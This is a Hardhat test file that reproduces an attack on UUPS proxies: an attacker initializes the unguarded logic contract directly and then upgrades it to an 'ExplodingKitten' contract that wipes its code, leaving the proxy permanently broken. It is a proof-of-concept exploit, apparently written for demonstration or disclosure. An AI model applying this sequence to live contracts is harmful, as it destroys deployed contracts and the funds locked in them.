import { expect } from "chai";
import { utils } from "ethers";
import { ethers, upgrades } from "hardhat";

const IMPLEMENTATION_SLOT =
  "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc";

const getImplementationAddress = async (proxyAddress: string) => {
  const implementationAddressFromStorage = await ethers.provider.getStorageAt(
    proxyAddress,
    IMPLEMENTATION_SLOT
  );
  return utils.getAddress(
    utils.hexDataSlice(implementationAddressFromStorage, 32 - 20)
  );
};

describe("ExplodingKitten", () => {
  it("should destroy an UUPS proxy with unguarded logic contract irrecoverably", async () => {
    const [deployer, attacker] = await ethers.getSigners();
    const SimpleToken = await ethers.getContractFactory("SimpleToken");
    const simpleToken = await upgrades.deployProxy(SimpleToken, {
      kind: "uups",
    });
    const implementationAddress = await getImplementationAddress(
      simpleToken.address
    );

    // Do something on proxy first
    await simpleToken.mint(deployer.address, 1000);

    // Verify correct behavior
    expect(await simpleToken.balanceOf(deployer.address)).to.equal(1000);
    expect(await simpleToken.totalSupply()).to.equal(1000);

    // Verify logic contract is non-zero
    expect(await ethers.provider.getCode(implementationAddress)).to.not.equal(
      "0x"
    );

    // Begin exploit
    const ExplodingKitten = await ethers.getContractFactory("ExplodingKitten");
    const explodingKitten = await ExplodingKitten.connect(attacker).deploy();
    await simpleToken
      .attach(implementationAddress)
      .connect(attacker)
      .initialize();
    await simpleToken
      .attach(implementationAddress)
      .connect(attacker)
      .upgradeToAndCall(explodingKitten.address, "0xb8b3dbc6");

    // Verify logic contract is zero
    expect(await ethers.provider.getCode(implementationAddress)).to.equal("0x");

    // Verify that proxy is no longer functioning
    await expect(simpleToken.balanceOf(deployer.address)).to.be.reverted;
    await expect(simpleToken.totalSupply()).to.be.reverted;

    // Verify that proxy can no longer upgrade
    const SimpleTokenV2 = await ethers.getContractFactory("SimpleTokenV2");
    const simpleTokenV2 = await SimpleTokenV2.deploy();
    await simpleToken.upgradeTo(simpleTokenV2.address); // Tx not failing as it's same as sending to an address without code now

    // Verify that the implementation code did not upgrade and is irrecoverable
    expect(await getImplementationAddress(simpleToken.address)).to.equal(
      implementationAddress
    );
    await expect(simpleToken.balanceOf(deployer.address)).to.be.reverted;
    await expect(simpleToken.totalSupply()).to.be.reverted;
  });
});
